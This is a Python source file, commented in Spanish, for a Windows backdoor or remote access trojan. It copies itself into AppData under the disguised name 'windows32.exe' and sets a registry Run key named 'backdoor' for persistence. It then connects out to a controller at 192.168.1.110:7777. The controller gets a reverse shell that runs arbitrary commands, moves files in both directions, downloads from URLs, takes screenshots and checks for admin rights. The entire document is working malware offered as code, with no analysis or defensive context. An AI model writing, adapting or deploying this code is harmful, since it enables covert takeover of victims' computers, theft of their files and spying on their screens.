#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import sys
import subprocess
import base64
import requests
import pyautogui
import time
import shutil

def admin_check():
   global admin
   try:
      check = os.listdir(os.sep.join([os.environ.get("SystemRoot", 'C:\Windows'), 'temp']))
   except:
      admin = "ERROR, Privilegios insuficientes"
   else:
      admin = "Privilegios de administrador"

def create_persistence():
   location = os.environ['appdata'] + '\\windows32.exe'
   if not os.path.exists(location):
      shutil.copyfile(sys.executable, location)
      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)


def connection():
   while True:
      time.sleep(5)
      try:
         cliente.connect(("192.168.1.110",7777))
         shell()
      except:
         connection()

def captura_pantalla():
   screenshot = pyautogui.screenshot()
   screenshot.save("monitor-1.png")

# Creamos una función que descarga un fichero de internet
def download_file(url):
   consulta = requests.get(url)
   name_file = url.split("/")[-1]
   with open(name_file, 'wb') as file_get:
      file_get.write(consulta.content)

def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir)
    while True:
      res = cliente.recv(1024)
      if res == "exit":
         break
      # Comprueba lo que hay después del cd, sigue ejecutando cmd y ejecuta el comando al cliente que se ha mandado desde el servidor
      elif res[:2] == "cd" and len(res) > 2:
         os.chdir(res[3:])
         result = os.getcwd()
         cliente.send(result)
      # Lee el documento que hayamos seleccionado
      elif res[:8] == "download":
         with open(res[9:], 'rb') as file_download:
            cliente.send(base64.b64encode(file_download.read()))
      # Escribe el documento que hayamos enviado desde el servidor
      elif res[:6] == "upload":
         with open(res[7:], 'wb') as file_upload:
            datos = cliente.recv(30000)
            file_upload.write(base64.b64decode(datos))
      # Ejecuta la funcion de descarga fichero pasandole por parametro la URL indicada e indica si se ha hecho correctamente o ha dado fallo
      elif res[:3] == "get":
         try:
            download_file(res[4:])
            cliente.send("Archivo descargado correctamente")
         except:
            cliente.send("Ocurrio un error en la descarga")
      elif res[:10] == "screenshot":
         try:
            captura_pantalla()
            with open('monitor-1.png', 'rb') as file_send:
               cliente.send(base64.b64encode(file_send.read()))
            os.remove("monitor-1.png")
         except:
            cliente.send(base64.b64encode("fail"))
      elif res[:5] == "start":
         try:
            subprocess.Popen(res[6:],shell=True)
            cliente.send("Programa iniciado con exito")
         except:
            cliente.send("No se pudo iniciar el programa")
      elif res[:5] == "check":
         try:
            admin_check()
            cliente.send(admin)
         except:
            cliente.send("No se pudo realizar la tarea")
      else:
         # Muestra por la consola del cliente el resultado de un comando o un error si el comando no existe, hay que hacerlo ya que la shell se quedaría colgada
         proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         result = proc.stdout.read() + proc.stderr.read()
         # En comandos como mkdir que no muestra un resultado, manda un 1 al servidor y así poder ejecutandose
         if len(result) == 0:
            cliente.send("1")
         else:
            cliente.send(result)

create_persistence()
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
cliente.close()